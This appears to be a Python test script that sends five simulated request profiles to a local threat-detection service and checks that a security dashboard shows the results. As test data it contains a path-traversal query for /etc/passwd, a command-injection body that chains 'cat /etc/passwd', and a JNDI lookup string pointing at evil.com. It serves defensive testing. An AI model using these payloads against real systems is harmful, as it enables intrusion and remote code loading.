#!/usr/bin/env python3
"""
Final dashboard test - simulate attacks and verify all fields display correctly
"""
import asyncio
import httpx
import time

async def final_dashboard_test():
    """Run final comprehensive test of dashboard functionality"""
    
    print("🎯 Final Dashboard Functionality Test")
    print("=" * 40)
    print("This will send 5 different attacks to test all dashboard fields")
    print("Watch the dashboard at: http://localhost:8080/simple-ai-dashboard.html")
    print("=" * 40)
    
    attacks = [
        {
            "name": "Path Traversal Attack",
            "features": {
                "method": "GET",
                "path": "/files",
                "client_ip": "198.51.100.50",
                "user_agent": "curl/7.68.0",
                "requests_per_minute": 15,
                "content_length": 0,
                "query_param_count": 1,
                "header_count": 4,
                "hour_of_day": 16,
                "query": "file=../../../etc/passwd",
                "body": ""
            },
            "context": {"previous_requests": 3, "failed_attempts": 2, "anomaly_score": 0.7}
        },
        {
            "name": "Command Injection",
            "features": {
                "method": "POST",
                "path": "/api/system",
                "client_ip": "233.252.0.25",
                "user_agent": "PostmanRuntime/7.29.0",
                "requests_per_minute": 8,
                "content_length": 50,
                "query_param_count": 0,
                "header_count": 6,
                "hour_of_day": 16,
                "query": "",
                "body": "{\"cmd\": \"ls -la; cat /etc/passwd\"}"
            },
            "context": {"previous_requests": 12, "failed_attempts": 5, "anomaly_score": 0.85}
        },
        {
            "name": "API Rate Limit Test",
            "features": {
                "method": "GET",
                "path": "/api/data",
                "client_ip": "203.0.113.200",
                "user_agent": "PythonRequests/2.28.1",
                "requests_per_minute": 200,
                "content_length": 0,
                "query_param_count": 2,
                "header_count": 8,
                "hour_of_day": 16,
                "query": "limit=1000&offset=0",
                "body": ""
            },
            "context": {"previous_requests": 150, "failed_attempts": 0, "anomaly_score": 0.4}
        },
        {
            "name": "Legitimate User Request",
            "features": {
                "method": "POST",
                "path": "/api/orders",
                "client_ip": "203.0.113.200",
                "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
                "requests_per_minute": 2,
                "content_length": 120,
                "query_param_count": 0,
                "header_count": 18,
                "hour_of_day": 16,
                "query": "",
                "body": "{\"product_id\": 12345, \"quantity\": 2, \"user_id\": \"user_abc123\"}"
            },
            "context": {"previous_requests": 45, "failed_attempts": 0, "anomaly_score": 0.05}
        },
        {
            "name": "Zero-Day Pattern",
            "features": {
                "method": "POST",
                "path": "/api/logs",
                "client_ip": "198.51.100.75",
                "user_agent": "Java/1.8.0_301",
                "requests_per_minute": 5,
                "content_length": 200,
                "query_param_count": 0,
                "header_count": 5,
                "hour_of_day": 16,
                "query": "",
                "body": "{\"message\": \"${jndi:ldap://evil.com/exploit}\"}"
            },
            "context": {"previous_requests": 8, "failed_attempts": 3, "anomaly_score": 0.95}
        }
    ]
    
    async with httpx.AsyncClient(timeout=30.0) as client:
        for i, attack in enumerate(attacks, 1):
            print(f"\n🚀 Sending Attack {i}/5: {attack['name']}")
            
            start_time = time.time()
            response = await client.post(
                "http://localhost:18002/analyze",
                json={
                    "features": attack["features"],
                    "context": attack["context"]
                }
            )
            processing_time = (time.time() - start_time) * 1000
            
            if response.status_code == 200:
                result = response.json()
                print(f"   ✅ Threat: {result['threat_type']} | Score: {result['threat_score']:.2f} | Action: {result['recommended_action']}")
                print(f"   ⏱️  Processing: {processing_time:.0f}ms")
            else:
                print(f"   ❌ Failed: {response.status_code}")
            
            # Wait 3 seconds between attacks for visual effect
            print("   ⏳ Waiting 3 seconds...")
            await asyncio.sleep(3)
    
    print("\n🎉 Test Complete!")
    print("\n📊 Dashboard Verification Checklist:")
    print("   ✓ Check that 'Avg Confidence' shows a percentage (not NaN%)")
    print("   ✓ Verify 'AI Reasoning' shows actual analysis text")
    print("   ✓ Confirm 'Request Details' shows Method, Path, Client IP, Query")
    print("   ✓ Ensure 'Recent Analysis' history shows real attack data")
    print("   ✓ Validate that threat scores and types are displayed correctly")

if __name__ == "__main__":
    asyncio.run(final_dashboard_test())